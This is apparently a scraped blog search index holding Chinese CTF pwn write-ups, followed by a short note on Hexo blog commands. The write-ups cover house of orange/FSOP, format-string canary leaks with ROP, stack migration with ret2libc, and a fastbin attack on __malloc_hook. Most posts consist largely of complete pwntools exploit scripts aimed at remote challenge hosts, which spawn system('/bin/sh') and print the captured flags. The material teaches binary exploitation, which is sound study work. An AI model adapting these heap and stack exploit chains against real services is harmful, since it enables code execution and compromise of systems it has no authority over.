，本地调试看不到预期结果【最好使用 Ubuntu16.04 尝试，否则看不了结构体….】 源码分析附件源码发现没有dele功能，并且根据题目不难猜到考察house of orange打法。查看edit功能发现输入字节数可控，并且没有对size进行检验，存在溢出漏洞。 满足 house_of_orange 的条件：堆溢出能修改 topchunk size ；申请 size 限制范围大；没有 free 功能。当topchunk 不能满足申请分配的大小时，topchunk 被释放进 unsortedbin ，可以实现没有 free 函数释放堆块。 分析思路：首先任意申请一个堆块，然后对它进行edit,利用堆溢出漏洞篡改topchunk的size值，将其改为一个较小的数。并且new_topchunk_size + chunk_0_size需要满足页对齐，即size总和为0x1000的倍数，这样就能绕过堆空间扩展时的检验。 接着申请一个大堆块满足chunk_1_size &gt; top_chunk_size，这样top_chunk就会被放到unsortedbin中，实现无free释放堆块。然后申请一个largebin范围的堆块，使得unsortedbin中的old_topchunk被分割，剩余部分进入largebins。并且堆块内部有残留的heap_addr和main_arena地址信息，进而show可以泄露得到libc_base和heap_addr，然后利用相对偏移计算得到_IO_list_all地址和system函数地址。 最后借助unsortedbin_attack劫持_IO_list_all达成FSOP利用。可以将_IO_list_all写值为main_arean+88显然，main_arena+88处的内容不是我们可以自由控制的，现在，假设我们将main_arena+88处看成是一个 IO_FILE结构体，那么struct_IO_FILE *_chain;指针的地址为:main_arena+88+0x68 = main_arena + 0xC0而main_arena + 0xC0存储着的是0x60大小的small bin第一个chunk的地址，所以我们要让我们伪造的堆块加入到 0x60的 small bin 中即可完成调用。而glibc并没有对堆块做太多的检测，只比较的 size，因此可以直接利用上述堆溢出修改size。然后伪造_IO_list_all结构，覆盖其overflow指针为目标函数，覆盖_IO_list_all指针为可控地址，最后触发程序错误或退出程序即可得到shell。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *def ini(name,os,arch): elf = ELF(name) context(log_level = &#x27;debug&#x27;,os = os,arch = arch)#io = process(&#x27;./Orange&#x27;)io = remote(&#x27;114.55.67.167&#x27;,&#x27;53544&#x27;)def add(size,data): io.sendafter(b&#x27;&gt;&gt;\\n&#x27;,str(1)) io.sendafter(b&#x27;\\n&#x27;,str(size)) io.sendafter(b&#x27;\\n&#x27;,data)def edit(index,size,data): io.sendafter(b&#x27;&gt;&gt;\\n&#x27;,str(2)) io.sendafter(b&#x27;\\n&#x27;,str(index)) io.sendafter(b&#x27;\\n&#x27;,str(size)) io.sendafter(b&#x27;\\n&#x27;,data)def show(index): io.sendafter(b&#x27;&gt;&gt;\\n&#x27;,str(3)) io.sendafter(b&#x27;\\n&#x27;,str(index))ini(&#x27;./Orange&#x27;,&#x27;linux&#x27;,&#x27;amd64&#x27;)#gdb.attach(io)#pause()add(0x18,b&#x27;a&#x27;*0x18)edit(0,0x28,b&#x27;A&#x27;*0x18+p64(0xfe1)) # 这里需要页对齐，0xfe0+0x20 = 0x1000add(0x1000,b&#x27;B&#x27;*0x8)add(0x400,b&#x27;C&#x27;*0x8)libc = ELF(&#x27;./libc-2.23.so&#x27;)show(2)io.recvuntil(b&#x27;C&#x27;*8)leak = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(&quot;leak==&gt;&quot;,hex(leak))_IO_list_all = leak+0x8+0x390print(&quot;_IO_list_all==&gt;&quot;,hex(_IO_list_all))libc_base = leak-0x3c5188print(&quot;libc_base==&gt;&quot;,hex(libc_base))edit(2,0x10,b&#x27;C&#x27;*0x10)show(2)io.recvuntil(b&#x27;C&#x27;*16)heap_leak = u64(io.recvline(keepends=False).ljust(8,b&#x27;\\x00&#x27;)) - 0x20print(&quot;heap_leak==&gt;&quot;,hex(heap_leak))target = elf.sym[&#x27;system&#x27;]target = libc_base+libc.sym[&#x27;system&#x27;]payload=b&#x27;f&#x27;*0x400payload1=b&#x27;/bin/sh\\x00&#x27;+p64(0x61) #old top chunk prev_size &amp; size 同时也是fake file的_flags字段payload1+=p64(0)+p64(_IO_list_all-0x10) #old top chunk fd &amp; bkpayload1+=p64(0)+p64(1) #_IO_write_base &amp; _IO_write_ptrpayload1 = payload1.ljust(0xc0,b&#x27;\\x00&#x27;)payload1 += p64(0)*3payload1+=p64(heap_leak+0x508) #作为vtable_start_addr# 即该填充数据所在地址payload1+=p64(0)+p64(0)+p64(target) #DUMMY finish overflowpayload += payload1edit(2,0x820,payload)io.sendafter(b&#x27;&gt;&gt;\\n&#x27;,str(1))io.interactive()#flag&#123;7452803d-f868de57-9651234-2e000b1e&#125; 参考house of orange House of orange-安全客 - 安全资讯平台 堆利用详解：the house of orange-Pwn-看雪-安全社区|安全招聘|kanxue.com green 32 位 fmt + 构造函数执行流 源码分析源码发现存在gets栈溢出漏洞，并且由于printf函数直接以s作为参数导致格式化字符串漏洞，可以泄露程序基地址和canary值。 分析首先利用第一个gets和printf泄露canary地址和程序基地址，然后加上偏移即可得到程序代码真实地址。由于存在栈溢出，并且发现flag输出函数： 因此只需要控制程序执行流依次给check1，check2，check3，finalcheck函数传递指定参数满足要求即可。Finalcheck函数放在最后执行即可获取shell。由于main函数地址已知，32位程序使用栈传递参数，而且执行流过长不易一次执行，因此依次跳转到main函数作为缓冲，一一赋值即可。 运行结果如下： exp123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#io = process(&#x27;./green&#x27;)io = remote(&#x27;114.55.67.167&#x27;,50564)p = ioelf = ELF(&#x27;./green&#x27;)#gdb.attach(io)#pause()offset = 0x4*8 payload = b&#x27;%3$p-%15$p&#x27; # base_addr+0x2f1 , canary_addrp.sendlineafter(b&#x27;Every protection is enabled. Good luck.\\n&#x27;,payload)base = int(p.recv(10),16) - 0x2f1io.recvuntil(b&#x27;-&#x27;)canary = int(io.recvline(keepends=False),16)print(&quot;canary==&gt;&quot;,hex(canary))print(&quot;base===&gt;&quot;,hex(base))func = 0x342 + basecheck1 = 0x20d + basecheck2 = 0x226 + basecheck3 = 0x23f + baseflag = 0x258 + baseebx = 0x1022 + basemain = base + 0x365payload = b&#x27;a&#x27;*offset + p32(canary) + p32(0)*3 + p32(check1) + p32(main) + p32(0x1337) p.sendline(payload)payload = b&#x27;a&#x27;*offset + p32(canary) + p32(0)*3 + p32(check2) + p32(main) + p32(0x420) p.sendlineafter(b&#x27;Every protection is enabled. Good luck.\\n&#x27;,b&#x27;a&#x27;)io.recvline()p.sendline(payload)payload = b&#x27;a&#x27;*offset + p32(canary) + p32(0)*3 + p32(check3) + p32(main) + p32(0xDEADBEEF) p.sendlineafter(b&#x27;Every protection is enabled. Good luck.\\n&#x27;,b&#x27;a&#x27;)io.recvline()p.sendline(payload)payload = b&#x27;a&#x27;*offset + p32(canary) + p32(0)*3 + p32(flag) + p32(main) + p32(0x123) p.sendlineafter(b&#x27;Every protection is enabled. Good luck.\\n&#x27;,b&#x27;a&#x27;)io.recvline()p.sendline(payload)io.interactive()# flag&#123;c6f3396244adadd3c53c49cf13ca864e&#125; stackmigration 64 位栈迁移，栈地址可知 源码 分析分析程序发现给出了输入点的栈地址，并且存在栈溢出，不过溢出长度有限，需要使用栈劫持，即直接在输入缓冲区布置payload，在程序返回点填充main函数地址以便ret2libc返回再次执行，然后利用leave将rip重新劫持到输入起始位置执行payload进行泄露函数真实地址。进而得到system函数和字符串“&#x2F;bin&#x2F;sh”真实地址。 接着，由于返回地址被修改为main_addr，因此会再次执行回到vul函数，这时候布置payload，由于leave指令的作用，后续会直接让程序转向执行system（&#x2F;bin&#x2F;sh）即可获得shell。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)from LibcSearcher import *#io = process(&#x27;./stack_migration&#x27;)io = remote(&#x27;114.55.67.167&#x27;,&#x27;54668&#x27;)elf = ELF(&#x27;./stack_migration&#x27;)puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main = elf.sym[&#x27;main&#x27;]ret = 0x000000000040065eleave = 0x0000000000400896pop_rdi = 0x0000000000400963offset = 0x20#gdb.attach(io)#pause()io.recvuntil(b&#x27;0x&#x27;)stack = int((io.recv(12).ljust(8,b&#x27;\\x00&#x27;)),16)print(hex(stack))p1 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)p1 += p64(stack-0x8) + p64(leave)io.sendafter(b&#x27;Do you still have something to say?\\n&#x27;,p1)puts = u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(&quot;puts===&gt;&quot;,hex(puts))libc = ELF(&#x27;./libc-2.23.so&#x27;)libc_base = puts-libc.sym[&#x27;puts&#x27;]sys = libc_base + libc.sym[&quot;system&quot;]bin = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))io.recvuntil(b&#x27;0x&#x27;)stack = int((io.recv(12).ljust(8,b&#x27;\\x00&#x27;)),16)print(&quot;stack===&gt;&quot;,hex(stack))p2 = (p64(pop_rdi) + p64(bin) + p64(sys)).ljust(offset,b&#x27;\\x00&#x27;)p2 += p64(stack-0x8) +p64(leave)io.sendafter(b&#x27;Do you still have something to say?\\n&#x27;,p2)io.interactive()# flag&#123;9bfc04fc-f4dd8d28-77a0b2b6-24867e58&#125; *babyheap源码 分析分析源码发现程序实现了增删改查四种功能，并且最多申请16个chunk，每个chunk大小不超过0x510。由于程序依赖libc版本为2.23，因此考虑使用unsortedbin attack，fastbin atack。 首先申请几个堆块，其中一个小chunk被两个大chunk夹着，然后通过释放前一个chunk，伪造后一个chunk的pre_size和pre_use标志位，然后再释放，绕过检测机制使得这三个chunk均被放入unsortedbin，利用show(1)泄露libc基地址，进而得到malloc_hook和realloc地址。利用fastbin_attack劫持fd指针，申请得到malloc_hook上方堆块，通过修改该堆块内容，将malloc_hook篡改为one_gadget。最后触发malloc_hook即可成功shell。 运行结果： exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899from pwn import *import timelocal_file = &#x27;./babyheap&#x27;elf = ELF(local_file)libc=ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;context.arch = elf.archs = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(delim, data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(delim, data)r = lambda numb=4096 :io.recv(numb)ru = lambda delims, drop=True :io.recvuntil(delims, drop)uu32 = lambda data :u32(data.ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda data :u64(data.ljust(8, b&#x27;\\x00&#x27;))get_q = lambda data: (~np.uint64(data) + 1)get_d = lambda data: (~np.uint32(data) + 1)def get_sh() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))info_addr = lambda tag, addr :io.info(tag + &#x27;==&gt;&#x27; +&#x27;: &#123;:#x&#125;&#x27;.format(addr))itr = lambda :io.interactive()io = remote(&#x27;121.41.16.43&#x27;,50604)#io = process(&#x27;./babyheap&#x27;)def men(i): ru(&#x27;&gt;&gt;&#x27;) sl(str(i))def add(size,content): men(1) ru(&#x27;want&#x27;) sl(str(size)) ru(&#x27;something&#x27;) sl(content)def edit(i,content): men(2) ru(&#x27;index&#x27;) sl(str(i)) ru(&#x27;something&#x27;) s(content)def show(i): men(3) ru(&#x27;index&#x27;) sl(str(i))def free(i): men(4) ru(&#x27;index&#x27;) sl(str(i))#gdb.attach(io)add(0x200,&#x27;a&#x27;*0x80)add(0x18,&#x27;a&#x27;*0x18)add(0x1f0,&#x27;a&#x27;*0x80)add(0x200,b’aaaa’)list1=0x6020C0free(0)edit(1,b&#x27;a&#x27;*0x10+p64(0x230))#pause()free(2)#pause()# chunk_1未被dele但是被consolidate合并入unsortedbins,old_chunk_2的 pre_size = old_chunk_0 + old_chunk_1，且size的pre_use置为了零add(0x200,&#x27;a&#x27;*0x80) # chunk_0#pause()show(1) # chunk_1未被dele但是被consolidate合并入unsortedbins,用于泄露libcru(&#x27;see see\\n&#x27;)libc_base=uu64(r(6))-0x3c4b78print(hex(libc_base))add(0x60,b&#x27;a&#x27;) #chunk_2#pause()free_hook=libc_base+0x3c67a8malloc=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]free(2)# chunk_2放入fastbins#pause()edit(1,p64(malloc-0x20-3)*2+b&#x27;\\n&#x27;)#pause()# fastbin--&gt;fd_hijacksys=libc_base+libc.sym[&#x27;system&#x27;]onegadget=[0x4527a,0xf03a4,0xf1247]realloc=libc_base+libc.sym[&#x27;realloc&#x27;]add(0x60,p64(sys))#pause()add(0x60,b&#x27;aaa&#x27;+p64(0)+p64(onegadget[0]+libc_base)+p64(realloc+0x8))#pause()io.interactive()# flag&#123;7421793d-f868de57-90556d34-2e000b1e&#125;","categories":[],"tags":[{"name":"<span class=\"label label-primary\">PWN</span>","slug":"span-class-label-label-primary-PWN-span","permalink":"https://12yhy3.github.io/tags/span-class-label-label-primary-PWN-span/"}]},{"title":"Stack_migrantion","slug":"Stack_migrantion","date":"2024-11-28T08:11:44.000Z","updated":"2024-11-28T08:18:06.297Z","comments":true,"path":"2024/11/28/Stack_migrantion/","permalink":"https://12yhy3.github.io/2024/11/28/Stack_migrantion/","excerpt":"","text":"一. 漏洞原理 二. 漏洞利用 任意地址写 > 情况1：存在**多次输入**和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。 > 第一次溢出覆盖栈底 rbp &#x2F; ebp，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp 为 address[password] + 4 ），根据第二次输入选择合适地址能够覆盖该值。 i386+ret2libc3 > size( buffer ) = 0x2c，read（0，&(rbp-0x2c)，0x34) 【溢出覆盖 ebp , ebp+0x4】 > > 注意点：read 代码段末尾自带 leave ; ret > > leave = mov ebp , esp + pop ebp [ 随后 esp+0x4] > > ret = pop rsp [ 随后 esp+0x4] > payload 结构图 | payload_1 | payload2 | payload3 | | --- | --- | --- | | buf_start aaaa | bss+0x800[利用后面的 leave ; ret 为payload3准备ebp】 | aaaa | | ... | puts_plt | system | | ... | read【puts 调用后返回地址】 | 0 | | ... | puts_got 【puts 参数】 | /bin/sh | | buf_end aaaa | aaaa...... | aaaa...... | | ebp bss+0x2c | bss | bss+0x800-0x2c | | \"eip\" leave ; ret | leave ; ret | leave | exp 123456789101112131415161718192021222324252627282930offset = 0x2cbss = 0x804c000-0x900puts_plt = 0x8048510 #elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]ebp = 0x804897bread = 0x08048829leave = 0x08048605payload1 = b&#x27;a&#x27;*offset + p32(bss+0x2c) + p32(read)io.send(payload1)p2 = p32(bss+0x800) + p32(puts_plt) + p32(read) + p32(puts_got) payload2 = p2.ljust(offset,b&#x27;\\x00&#x27;) + p32(bss) + p32(leave)io.send(payload2)puts = u32(r.recvuntil(b&#x27;\\xf7&#x27;)[-4:])print(hex(puts))libc = LibcSearcher(&quot;puts&quot;,puts)libc_base = puts - libc.dump(&quot;puts&quot;)print(hex(libc_base))sym = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)p3 =b&#x27;a&#x27;*4 + p32(sym) + p32(0) + p32(binsh_addr)payload3 =p3.ljust(offset, b&#x27;\\x00&#x27;) +p32(bss +0x800 -0x2c) +p32(leave)r.send(payload3)r.interactive() 三. 例题 溢出4/8字节 栈地址可知 栈地址未知 溢出8/16字节 栈地址可知 > 如果可以获取输入地点的栈地址，或者bss段/堆空间 找不到合适空间，并且输入点长度足够构造ROP链，可以直接在输入点进行二次栈迁移。 > 通常可以获取栈地址的方法： 程序直接给出。 通过printf，puts 等函数泄露。（注意：**printf函数通过%s泄露的是 某地址 存储的 数据而不是实际地址，**puts函数与之效果相同）（可参见例题2，ebp-0x40而不是ebp-0x30）。 stack migration > 题源：BUUCTF-PWN（[NewStarCTF 2023 公开赛道]） > 方法1：栈迁移+ret2libc3 源码 ![](Stack_migration/1.png) ![](./test/image.png) 栈帧结构 payload'2'为参考exp构造，[详见](https://blog.csdn.net/Xzzzz911/article/details/133842017)。官方wp同payload2。 payload 1 payload 2 payload ‘2’ aaaaaaaa buf 1**** :::color5 &lt;—-stack—&gt;::: buf 1 aaaaaaaa aaaaaaaa aaaaaaaa buf 2 buf 2 pop rdi；ret bbbbbbbb pop rdi；ret bin ** ret** got sys pop rdi；ret plt aaaaaaaa bin main aaaaaaaa sys aaa…… aaa……. aaa…… ** fake_rbp** （stack） :::color5 &lt;——-rbp—&gt;::: ** **** stack** ** stack+8** ** leave；ret** ** leave；ret** ** leave；ret** 栈迁移运行流程 > 与本题不太一样，payload1中buf2处填充8字节数据平衡栈帧，否则接收不到再次进入main时候的栈地址。 > 一. 栈迁移调用 puts函数 泄露puts真实地址 二. 返回到main函数后第二次栈迁移获取shell （1）函数内部结尾的 **leave结束后**栈结构： stack aaaaaaaa buf 1 aaaaaaaa &lt;—rbp pop rdi；ret buf 2 pop rdi；ret bin bin sys sys aaaaaaaa aaaaaaaa aaaaaaaa aaaaaaaa aaa……. aaa……. rbp,rsp–&gt; ** **** stack** ** **** stack** ** leave；ret** ** leave；ret** &lt;—rsp ret结束后， rip 指向 ** leave；ret **地址，rsp比原来向下移动 4&#x2F;8字节。 （2）**rip执行leave后**： 此时rbp内部完全是数据（aaaaaaaa） payload 2 buf 1 aaaaaaaa buf 2 pop rdi；ret &lt;—rsp bin sys aaaaaaaa aaaaaaaa aaa……. ** **** stack** ** leave；ret** **rip执行ret之后**： rsp—&gt;&#x2F;bin&#x2F;sh rip—-&gt;pop rdi；ret （3）**rip执行pop rdi后：** rdi—&gt;&#x2F;bin&#x2F;sh rsp—&gt;system rip—&gt;ret rip执行ret指令： rip—&gt;system（system_plt） rsp—&gt;aaaaaa 接着会调用system函数，同时rdi的数据&#x2F;bin&#x2F;sh成为参数，执行了shell。 exp示例 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)from LibcSearcher import *#io = process(&#x27;./pwn2&#x27;)io = remote(&#x27;node5.buuoj.cn&#x27;,28894)elf = ELF(&#x27;./pwn2&#x27;)puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main = 0x4012acret = 0x40101aleave = 0x4012aapop_rdi = 0x401333offset = 0x50io.sendafter(b&#x27;name:\\n&#x27;,b&#x27;aaaaaaaa&#x27;) #p64(pop_rdi)io.recvuntil(b&#x27;0x&#x27;)stack = int((io.recv(12).ljust(8,b&#x27;\\x00&#x27;)),16)print(hex(stack))#=堆栈平衡，令ROP向下挪移8字节（p64(0)，stack+8），否则第二次接受不到栈地址0x...=#泄漏stack为第一个buf地址（第一次读入八字节的地址）p1 = (p64(0)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)).ljust(offset,b&#x27;a&#x27;) p1 += p64(stack+8) + p64(leave)#======================================================================io.sendafter(b&#x27;plz:\\n&#x27;,p1)io.recvuntil(b&quot;maybe I&#x27;ll see you soon!\\n&quot;)puts =u64(io.recvuntil(b&#x27;\\x7f&#x27;)[:6].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts))libc = LibcSearcher(&#x27;puts&#x27;,puts)libc_base = puts-libc.dump(&#x27;puts&#x27;)sys = libc_base + libc.dump(&#x27;system&#x27;)bin = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)io.sendafter(b&#x27;name:\\n&#x27;,b&#x27;a&#x27;*8)io.recvuntil(b&#x27;0x&#x27;)stack = int((io.recv(12).ljust(8,b&#x27;\\x00&#x27;)),16)#===============此处直接填充亦可==========================p2 = (p64(pop_rdi) + p64(bin) + p64(sys)).ljust(offset,b&#x27;\\x00&#x27;)p2 += p64(stack) +p64(leave)#========================================================io.sendafter(b&#x27;plz:\\n&#x27;,p2)io.interactive() 方法2：leak_libc_base+栈迁移 主要思路：由于printf以%s打印数据时候遇到 b’\\x00’ 才会停止。输入满8字节，利用printf函数可以直接打印出函数 _IO_file_jumps 地址，利用给出的 libc程序进而获取 libc_base 地址， 然后直接得到system和&#x2F;bin&#x2F;sh地址，只进行一次栈迁移（payload2）即可获取shell。 tips：有个疑点，如下图。kali与Xubuntu下gdb调试的栈帧结构出现了不一致…… kali下_IO_file_jumps函数在打印地址上方，但实际上应该在下面。所以才会带出_IO_file_jumps函数地址。 Xubuntu下gdb调试结构：（与靶机实际栈结构一致） exp如下： 1234567891011121314151617181920212223242526272829from pwn import *context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)from LibcSearcher import *io = remote(&#x27;node5.buuoj.cn&#x27;,27066)main = 0x4012acret = 0x40101aleave = 0x4012aapop_rdi = 0x401333offset = 0x50# 第一次发送数据利用printf函数泄露一个函数地址io.sendafter(b&#x27;name:\\n&#x27;,b&#x27;aaaaaaaa&#x27;) _IO_file_jumps =u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(_IO_file_jumps))# 获得栈地址io.recvuntil(b&#x27;0x&#x27;)stack = int((io.recv(12).ljust(8,b&#x27;\\x00&#x27;)),16)print(hex(stack))libc = LibcSearcher(&#x27;_IO_file_jumps&#x27;,_IO_file_jumps)libc_base = _IO_file_jumps-libc.dump(&#x27;_IO_file_jumps&#x27;)sys = libc_base + libc.dump(&#x27;system&#x27;)bin = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)p2 = (p64(pop_rdi) + p64(bin) + p64(sys)).ljust(offset,b&#x27;\\x00&#x27;)p2 += p64(stack) +p64(leave)io.sendafter(b&#x27;plz:\\n&#x27;,p2)io.interactive() 八字节能干什么 > 题源：PolarD&N-PWN > 源码 首先有两次输入机会，并且 ebp 和 ebp+4 可以控制。给出了system('ls')；可以调用system函数。 分析 第一次输入填充垃圾数据，利用printf函数泄露 ebp 的内容，然后 减去 偏移得到栈地址。 第二次构造ROP链，利用read向栈读入 &#x2F;bin&#x2F;sh\\x00 参数 构造 system(‘&#x2F;bin&#x2F;sh’)后面函数。ebp填充栈地址，然后填充leave；ret 进行栈迁移，使得程序再次从栈地址运行，获取shell。 exp： 123456789101112131415161718192021from pwn import *context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;120.46.59.242&#x27;,2109)#io = process(&#x27;./1&#x27;)elf = ELF(&#x27;./1&#x27;)io.send(b&#x27;a&#x27;*0x30)io.recvuntil(b&#x27;a&#x27;*0x30)ebp_addr = u32(io.recv(4))stack = ebp_addr-0x40print(hex(stack))leave = 0x8048488sys = elf.sym[&#x27;system&#x27;]p1 = (b&#x27;aaaa&#x27; + p32(sys) + p32(1) + p32(stack+0x10) + b&#x27;/bin/sh&#x27; ).ljust(0x30,b&#x27;\\x00&#x27;) #注意\\x00防止截断，否则出错。并且stack处不能填充b&#x27;/bin/sh&#x27;p1 += p32(stack) + p32(leave)io.send(p1)io.interactive() 栈地址未知 > 此时将栈迁移到bss段，或者需要利用read进行任意地址写。 > > 与栈地址可知最大的区别： > > **通常第一次payload 的rip/eip填充的都是主函数代码复用read等片段**，此时需要注意**第二次payload填充时候是从fake_rbp-buf 地址开始写入，并且溢出字节依然有限**，通常需要多次payload和使用leave地址。 > stack migration revenge > 题源：BUUCTF-PWN（ [NewStarCTF 2023 公开赛道] ) > 源码 反汇编得到主要功能函数代码 查看汇编代码获取调用read函数的代码段地址，便于后续利用read写入数据，同时减少了调用read_plt需要传参的问题。 查看可写代码段bss地址，选用大于0x404070并且小于0x405000的位置布置rop。 构造rop链 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;r = remote(&#x27;node5.buuoj.cn&#x27;,26923)elf = ELF(&#x27;./pwn&#x27;)offset = 0x50bss = 0x405000-0x900read = 0x4011ffputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]pop_rbp = 0x40115dleave = 0x401227pop_rdi = 0x4012b3ret = 0x40101apayload = b&#x27;a&#x27;*offset + p64(bss+0x50) + p64(read)r.sendafter(b&#x27;just chat with me:\\n&#x27;,payload)# 第二次payload会调用read从rbp-0x50即 bss地址开始写入p2 = b&#x27;a&#x27;*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)p2 += p64(pop_rbp) + p64(bss+0x800) + p64(read)p2 = p2.ljust(offset,b&#x27;\\x00&#x27;) + p64(bss) + p64(leave)r.sendafter(b&#x27;so funny\\n&#x27;,p2) # p64(bss) + p64(leave) :将rbp转到bss地址，此时栈结构：# rbp aaaaaaaa# rip p64(pop_rdi) + p64(puts_got) + p64(puts_plt) -----leak_addr# rip-&gt;rip p64(pop_rbp) + p64(bss+0x800) + p64(read)# 栈迁移第二个输入点，用于向 bss+0x750地址 填充system(/bin/sh)r.recvuntil(b&#x27;so funny\\n&#x27;)puts =u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts))libc = LibcSearcher(&quot;puts&quot;,puts)libc_base = puts - libc.dump(&quot;puts&quot;)print(hex(libc_base))system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload =p64(pop_rdi) +p64(binsh_addr) +p64(system_addr)payload =payload.ljust(0x50, b&#x27;\\x00&#x27;) +p64(bss +0x800 -0x58) +p64(leave)# 再次调转执行，从 bss+0x748开始，由于该地址为无关数据，有效地址从bss+0x750开始，因此 执行system(/bin/sh)r.send(payload)r.interactive() pwn271 参见 pwn 入门 wp，结合上面漏洞利用 32 位程序。","categories":[],"tags":[{"name":"<span class=\"label label-primary\">PWN</span>","slug":"span-class-label-label-primary-PWN-span","permalink":"https://12yhy3.github.io/tags/span-class-label-label-primary-PWN-span/"}]},{"title":"test","slug":"test","date":"2024-11-25T02:00:00.000Z","updated":"2024-12-02T09:18:26.432Z","comments":true,"path":"2024/11/25/test/","permalink":"https://12yhy3.github.io/2024/11/25/test/","excerpt":"","text":"以下是文章内容 iframe插件 Git Bash构建并推送更新到github&#x2F;本地12hexo c &amp;&amp; hexo g &amp;&amp; hexo d或 hexo g -d 启动本地服务1hexo s(erver) 清除缓存 修改文章后需要清除缓存，然后进行构建和推送 1hexo clean 参考fluid示例bloghexo命令行发布文章1hexo new test # 创建新文章test,同时会创建/post/test文件夹用于存放使用的图片等资源 图片显示问题123在博客根目录source文件下新建images文件夹，用于存放博客插入的图片 ，然后在文章中插入图片即可格式为 ![图片名称](/images/xxx.png)路径：/source/img 用来存放博客背景等图片 如参考 其他小问题1231. 开启代理查看博客时候显示会有点问题...2. 远程部署的字体偏小，先凑合看吧..","categories":[],"tags":[{"name":"<span class=\"label label-info\">others</span>","slug":"span-class-label-label-info-others-span","permalink":"https://12yhy3.github.io/tags/span-class-label-label-info-others-span/"}]}],"categories":[],"tags":[{"name":"<span class=\"label label-primary\">PWN</span>","slug":"span-class-label-label-primary-PWN-span","permalink":"https://12yhy3.github.io/tags/span-class-label-label-primary-PWN-span/"},{"name":"<span class=\"label label-info\">others</span>","slug":"span-class-label-label-info-others-span","permalink":"https://12yhy3.github.io/tags/span-class-label-label-info-others-span/"}]}